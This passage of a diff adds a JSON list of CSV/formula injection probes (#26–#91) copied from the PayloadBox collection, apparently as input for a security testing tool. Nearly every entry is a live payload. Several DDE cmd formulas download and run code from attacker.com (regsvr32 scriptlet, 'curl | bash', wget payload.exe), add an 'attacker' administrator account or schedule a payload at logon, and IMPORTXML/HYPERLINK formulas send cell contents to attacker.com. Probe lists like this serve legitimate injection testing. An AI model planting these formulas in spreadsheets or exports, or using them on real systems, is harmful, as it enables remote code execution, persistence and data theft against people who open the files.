+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0026",
+    "name": "Csv Injection Intruder #26",
+    "template": "=cmd|'/c rundll32.exe \\\\10.0.0.1\\3\\2\\1.dll,0'!_xlbgnm.A1",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: =cmd|'/c rundll32.exe \\\\10.0.0.1\\3\\2\\1.dll,0'!_xlbgnm.A1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0027",
+    "name": "Csv Injection Intruder #27",
+    "template": "=cmd|'/c regsvr32 /s /n /u /i:http://attacker.com/file.sct scrobj.dll'!A0",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: =cmd|'/c regsvr32 /s /n /u /i:http://attacker.com/file.sct s...",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0028",
+    "name": "Csv Injection Intruder #28",
+    "template": "=HYPERLINK(\"http://attacker.com\",\"Click me\")",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: =HYPERLINK(\"http://attacker.com\",\"Click me\")",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0029",
+    "name": "Csv Injection Intruder #29",
+    "template": "=HYPERLINK(\"http://attacker.com?c=\",\"Click Here\")",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: =HYPERLINK(\"http://attacker.com?c=\",\"Click Here\")",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0030",
+    "name": "Csv Injection Intruder #30",
+    "template": "=HYPERLINK(\"file:///C:/Windows/System32/calc.exe\",\"Click\")",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: =HYPERLINK(\"file:///C:/Windows/System32/calc.exe\",\"Click\")",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0031",
+    "name": "Csv Injection Intruder #31",
+    "template": "@HYPERLINK(\"http://attacker.com\",\"Click\")",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: @HYPERLINK(\"http://attacker.com\",\"Click\")",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0032",
+    "name": "Csv Injection Intruder #32",
+    "template": "+HYPERLINK(\"http://attacker.com\",\"Click\")",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: +HYPERLINK(\"http://attacker.com\",\"Click\")",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0033",
+    "name": "Csv Injection Intruder #33",
+    "template": "-HYPERLINK(\"http://attacker.com\",\"Click\")",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: -HYPERLINK(\"http://attacker.com\",\"Click\")",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0034",
+    "name": "Csv Injection Intruder #34",
+    "template": "=IMPORTXML(CONCAT(\"http://attacker.com/?v=\",A1),\"//a\")",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: =IMPORTXML(CONCAT(\"http://attacker.com/?v=\",A1),\"//a\")",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0035",
+    "name": "Csv Injection Intruder #35",
+    "template": "=IMPORTFEED(\"http://attacker.com/feed.xml\")",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: =IMPORTFEED(\"http://attacker.com/feed.xml\")",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0036",
+    "name": "Csv Injection Intruder #36",
+    "template": "@IMPORTXML(CONCAT(\"http://attacker.com/?v=\",A1),\"//a\")",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: @IMPORTXML(CONCAT(\"http://attacker.com/?v=\",A1),\"//a\")",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0037",
+    "name": "Csv Injection Intruder #37",
+    "template": "=cmd|'/c net user attacker password /add'!A0",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: =cmd|'/c net user attacker password /add'!A0",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0038",
+    "name": "Csv Injection Intruder #38",
+    "template": "=cmd|'/c net localgroup administrators attacker /add'!A0",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: =cmd|'/c net localgroup administrators attacker /add'!A0",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0039",
+    "name": "Csv Injection Intruder #39",
+    "template": "=cmd|'/c schtask /create /tn Task /tr C:\\temp\\payload.exe /sc onlogon'!A0",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: =cmd|'/c schtask /create /tn Task /tr C:\\temp\\payload.exe /s...",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0040",
+    "name": "Csv Injection Intruder #40",
+    "template": "=MSEXCEL|'\\..\\..\\..\\Windows\\System32\\cmd.exe /c calc'!A1",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: =MSEXCEL|'\\..\\..\\..\\Windows\\System32\\cmd.exe /c calc'!A1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0041",
+    "name": "Csv Injection Intruder #41",
+    "template": "=MSEXCEL|'\\..\\..\\..\\Windows\\System32\\cmd.exe /c powershell'!A1",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: =MSEXCEL|'\\..\\..\\..\\Windows\\System32\\cmd.exe /c powershell'!...",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0042",
+    "name": "Csv Injection Intruder #42",
+    "template": "'=cmd|'/c calc'!A1",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: '=cmd|'/c calc'!A1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0043",
+    "name": "Csv Injection Intruder #43",
+    "template": "'@SUM(1+1)",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: '@SUM(1+1)",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0044",
+    "name": "Csv Injection Intruder #44",
+    "template": "'+1+1",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: '+1+1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0045",
+    "name": "Csv Injection Intruder #45",
+    "template": "'-1+1",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: '-1+1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0046",
+    "name": "Csv Injection Intruder #46",
+    "template": "'=DDE(\"cmd\";\"/C calc\";\"!A0\")",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: '=DDE(\"cmd\";\"/C calc\";\"!A0\")",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0047",
+    "name": "Csv Injection Intruder #47",
+    "template": "%3D1%2B1",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: %3D1%2B1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0048",
+    "name": "Csv Injection Intruder #48",
+    "template": "%3Dcmd%7C%27%2Fc%20calc%27%21A1",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: %3Dcmd%7C%27%2Fc%20calc%27%21A1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0049",
+    "name": "Csv Injection Intruder #49",
+    "template": "%3DDDE%28%22cmd%22%3B%22%2FC%20calc%22%3B%22%21A0%22%29",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: %3DDDE%28%22cmd%22%3B%22%2FC%20calc%22%3B%22%21A0%22%29",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0050",
+    "name": "Csv Injection Intruder #50",
+    "template": "%0A=1+1",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: %0A=1+1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0051",
+    "name": "Csv Injection Intruder #51",
+    "template": "%0D=1+1",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: %0D=1+1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0052",
+    "name": "Csv Injection Intruder #52",
+    "template": "%0A=cmd|'/c calc'!A1",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: %0A=cmd|'/c calc'!A1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0053",
+    "name": "Csv Injection Intruder #53",
+    "template": "%0D=cmd|'/c calc'!A1",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: %0D=cmd|'/c calc'!A1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0054",
+    "name": "Csv Injection Intruder #54",
+    "template": "%09=1+1",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: %09=1+1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0055",
+    "name": "Csv Injection Intruder #55",
+    "template": "%09=cmd|'/c calc'!A1",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: %09=cmd|'/c calc'!A1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0056",
+    "name": "Csv Injection Intruder #56",
+    "template": "=5-3+cmd|' /C calc'!A0",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: =5-3+cmd|' /C calc'!A0",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0057",
+    "name": "Csv Injection Intruder #57",
+    "template": "=5*6+cmd|' /C calc'!A0",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: =5*6+cmd|' /C calc'!A0",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0058",
+    "name": "Csv Injection Intruder #58",
+    "template": "=6/2+cmd|' /C calc'!A0",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: =6/2+cmd|' /C calc'!A0",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0059",
+    "name": "Csv Injection Intruder #59",
+    "template": "=AVERAGE(1,2,3)+cmd|' /C calc'!A0",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: =AVERAGE(1,2,3)+cmd|' /C calc'!A0",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0060",
+    "name": "Csv Injection Intruder #60",
+    "template": "=MAX(1,2,3)+cmd|' /C calc'!A0",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: =MAX(1,2,3)+cmd|' /C calc'!A0",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0061",
+    "name": "Csv Injection Intruder #61",
+    "template": "=MIN(1,2,3)+cmd|' /C calc'!A0",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: =MIN(1,2,3)+cmd|' /C calc'!A0",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0062",
+    "name": "Csv Injection Intruder #62",
+    "template": "@AVG(1+1)*cmd|' /C calc'!A0",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: @AVG(1+1)*cmd|' /C calc'!A0",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0063",
+    "name": "Csv Injection Intruder #63",
+    "template": "@MAX(1+1)*cmd|' /C calc'!A0",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: @MAX(1+1)*cmd|' /C calc'!A0",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0064",
+    "name": "Csv Injection Intruder #64",
+    "template": "@MIN(1+1)*cmd|' /C calc'!A0",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: @MIN(1+1)*cmd|' /C calc'!A0",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0065",
+    "name": "Csv Injection Intruder #65",
+    "template": "=IF(1=1,cmd|'/c calc'!A1,\"false\")",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: =IF(1=1,cmd|'/c calc'!A1,\"false\")",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0066",
+    "name": "Csv Injection Intruder #66",
+    "template": "=IFERROR(cmd|'/c calc'!A1,\"error\")",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: =IFERROR(cmd|'/c calc'!A1,\"error\")",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0067",
+    "name": "Csv Injection Intruder #67",
+    "template": "@IF(1=1,cmd|'/c calc'!A1,\"false\")",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: @IF(1=1,cmd|'/c calc'!A1,\"false\")",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0068",
+    "name": "Csv Injection Intruder #68",
+    "template": "=CONCATENATE(cmd|'/c calc'!A1)",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: =CONCATENATE(cmd|'/c calc'!A1)",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0069",
+    "name": "Csv Injection Intruder #69",
+    "template": "=CONCAT(cmd|'/c calc'!A1)",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: =CONCAT(cmd|'/c calc'!A1)",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0070",
+    "name": "Csv Injection Intruder #70",
+    "template": "@CONCATENATE(cmd|'/c calc'!A1)",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: @CONCATENATE(cmd|'/c calc'!A1)",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0071",
+    "name": "Csv Injection Intruder #71",
+    "template": "=cmd|'/c start cmd'!A1",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: =cmd|'/c start cmd'!A1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0072",
+    "name": "Csv Injection Intruder #72",
+    "template": "=cmd|'/c start powershell'!A1",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: =cmd|'/c start powershell'!A1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0073",
+    "name": "Csv Injection Intruder #73",
+    "template": "=cmd|'/c cmd.exe /c calc'!A1",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: =cmd|'/c cmd.exe /c calc'!A1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0074",
+    "name": "Csv Injection Intruder #74",
+    "template": "=cmd|'/c cmd.exe /k calc'!A1",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: =cmd|'/c cmd.exe /k calc'!A1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0075",
+    "name": "Csv Injection Intruder #75",
+    "template": "=cmd|'/c wmic process call create calc'!A1",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: =cmd|'/c wmic process call create calc'!A1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0076",
+    "name": "Csv Injection Intruder #76",
+    "template": "=cmd|'/c wscript C:\\temp\\payload.vbs'!A1",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: =cmd|'/c wscript C:\\temp\\payload.vbs'!A1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0077",
+    "name": "Csv Injection Intruder #77",
+    "template": "=cmd|'/c cscript C:\\temp\\payload.vbs'!A1",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: =cmd|'/c cscript C:\\temp\\payload.vbs'!A1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0078",
+    "name": "Csv Injection Intruder #78",
+    "template": "=cmd|'/c curl http://attacker.com/shell.sh | bash'!A1",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: =cmd|'/c curl http://attacker.com/shell.sh | bash'!A1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0079",
+    "name": "Csv Injection Intruder #79",
+    "template": "=cmd|'/c wget http://attacker.com/payload -O C:\\temp\\payload.exe'!A1",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: =cmd|'/c wget http://attacker.com/payload -O C:\\temp\\payload...",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0080",
+    "name": "Csv Injection Intruder #80",
+    "template": "=cmd|'/c type C:\\Windows\\System32\\drivers\\etc\\hosts'!A1",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: =cmd|'/c type C:\\Windows\\System32\\drivers\\etc\\hosts'!A1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0081",
+    "name": "Csv Injection Intruder #81",
+    "template": "=cmd|'/c dir C:\\'!A1",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: =cmd|'/c dir C:\\'!A1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0082",
+    "name": "Csv Injection Intruder #82",
+    "template": "=cmd|'/c tasklist'!A1",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: =cmd|'/c tasklist'!A1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0083",
+    "name": "Csv Injection Intruder #83",
+    "template": "=cmd|'/c netstat -an'!A1",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: =cmd|'/c netstat -an'!A1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0084",
+    "name": "Csv Injection Intruder #84",
+    "template": "=cmd|'/c systeminfo'!A1",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: =cmd|'/c systeminfo'!A1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0085",
+    "name": "Csv Injection Intruder #85",
+    "template": "=cmd|'/c net user'!A1",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: =cmd|'/c net user'!A1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0086",
+    "name": "Csv Injection Intruder #86",
+    "template": "=cmd|'/c net localgroup administrators'!A1",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: =cmd|'/c net localgroup administrators'!A1",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0087",
+    "name": "Csv Injection Intruder #87",
+    "template": "=EXEC(\"calc\")",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: =EXEC(\"calc\")",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0088",
+    "name": "Csv Injection Intruder #88",
+    "template": "=EXEC(\"notepad\")",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: =EXEC(\"notepad\")",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0089",
+    "name": "Csv Injection Intruder #89",
+    "template": "=SYSTEM(\"calc\")",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: =SYSTEM(\"calc\")",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0090",
+    "name": "Csv Injection Intruder #90",
+    "template": "@EXEC(\"calc\")",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: @EXEC(\"calc\")",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  },
+  {
+    "id": "csv-injection-pbox-0091",
+    "name": "Csv Injection Intruder #91",
+    "template": "@SYSTEM(\"calc\")",
+    "description": "CSV Injection probe from PayloadBox (csv-injection-intruder.txt). Tests application handling of: @SYSTEM(\"calc\")",
+    "enabled": true,
+    "sourceType": "PayloadBox",
+    "sourceFile": "csv-injection-intruder.txt"
+  }
+]
